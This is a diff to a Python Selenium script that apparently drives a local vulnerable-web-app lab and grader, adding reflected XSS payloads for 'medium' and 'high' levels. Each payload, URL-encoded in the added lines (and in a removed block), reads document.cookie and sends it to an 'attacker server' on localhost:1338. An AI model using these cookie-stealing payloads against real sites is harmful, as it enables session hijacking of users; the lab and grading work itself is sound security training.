@@ -12,7 +12,7 @@ def xss(vuln_type, level):
     # TODO remove this if statement
     if(vuln_type != '1'):
         return
-    if(level != 'low'):
+    if(level != 'low' and level != 'medium' and level != 'high'):
         return
     options = Options()
     options.add_argument("--headless")
@@ -24,25 +24,22 @@ def xss(vuln_type, level):
 
     # Low Reflected XSS
     if vuln_type == '1' and level == 'low':
-        comment_txt = """var cookie=document.cookie;
-                         $.ajax({
-                                 url: "http://localhost:1338/xss/low?cookie="+cookie,
-	                             });
-                      """
-        url = "http://localhost:1337/xss/1/low?comment=%22%3Cscript%3Evar%20cookie=document.cookie;$.ajax({url:%20%22http://localhost:1338/xss/reflected?cookie=%22.concat(cookie)});%3C/script%3E%22"
+        url = "http://localhost:1337/xss/1/low?comment=%22%3Cscript%3Evar%20cookie=document.cookie;$.ajax({url:%20%22http://localhost:1338/xss/reflected_low?cookie=%22.concat(cookie)});%3C/script%3E%22"
         driver.get(url)
-        print("URL IS: " + url)
-        print("qutting driver")
-        driver.quit()
-        print('driver quit')
-    else:
-        print("quitting driver")
-        driver.quit()
+    elif vuln_type == '1' and level == 'medium':
+        url = "http://localhost:1337/xss/1/medium?comment=%3CBODY%20ONLOAD=$.ajax({url:%22http://localhost:1338/xss/reflected_medium?cookie=%22.concat(document.cookie)})%3E"
+        driver.get(url)
+    elif vuln_type == '1' and level == 'high':
+        url = "http://localhost:1337/xss/1/high?comment=%3CBODY%20ONLOAD=$.ajax({url:%22http://localhost:1338/xss/reflected_high?cookie=%22.concat(document.cookie)})%3E"
+        driver.get(url)
+
+    if vuln_type == '1' and level == 'medium':
+        pass
 
 
     # Grader verification should be done in attacker_server/server.py
 
-    # driver.quit() # Closes the browser
+    driver.quit() # Closes the browser
 
 def sql():
     options = Options()
